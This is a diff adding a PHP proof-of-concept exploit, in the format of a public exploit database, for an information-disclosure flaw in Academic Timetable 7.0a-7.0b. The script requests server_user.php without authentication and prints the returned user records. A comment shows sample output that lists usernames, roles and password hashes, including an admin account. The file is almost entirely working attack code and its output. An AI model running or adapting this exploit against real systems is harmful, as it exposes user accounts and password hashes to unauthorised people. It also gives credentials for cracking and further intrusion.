@@ -1,0 +1,60 @@
+<?php
+# Exploit Title: Academic Timetable Final Build 7.0a-7.0b - User Information Disclosure
+# Dork: N/A
+# Date: 2018-10-13
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://geoffpartridge.net/
+# Software Link: https://sourceforge.net/projects/timetableacademic/files/latest/download
+# Version: 7.0a-7.0b
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+header ('Content-type: text/html; charset=UTF-8');
+
+$urlemiz= "http://192.168.1.27/[PATH]/";
+$yuk="server_user.php?sEcho=10&iColumns=10&iDisplayStart=0&iDisplayLength=10&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&iSortCol_0=0&sSortDir_0=asc&iSortingCols=1&bSortable_0=true&bSearchable_3=0";
+$jsonveri = file_get_contents($urlemiz.$yuk);
+$ver = json_decode($jsonveri,true);
+echo "<pre>\n";
+print_r($ver);
+echo "\n</pre>";
+/**
+Array
+(
+    [sEcho] => 10
+    [iTotalRecords] => 3
+    [iTotalDisplayRecords] => 3
+    [aaData] => Array
+        (
+            [0] => Array
+                (
+                    [0] => testdb1
+                    [1] => testdb1
+                    [2] => ADMIN
+                    [3] => *6CC4E8CFFEAF202D7475BC906612F9A29A9C8117
+                )
+
+            [1] => Array
+                (
+                    [0] => ADMIN
+                    [1] => admin
+                    [2] => ADMIN
+                    [3] => *4ACFE3202A5FF5CF467898FC58AAB1D615029441
+                )
+
+            [2] => Array
+                (
+                    [0] => STAFF
+                    [1] => Staff
+                    [2] => VIEW
+                    [3] => 
+                )
+
+        )
+
+)
+ */
+?>
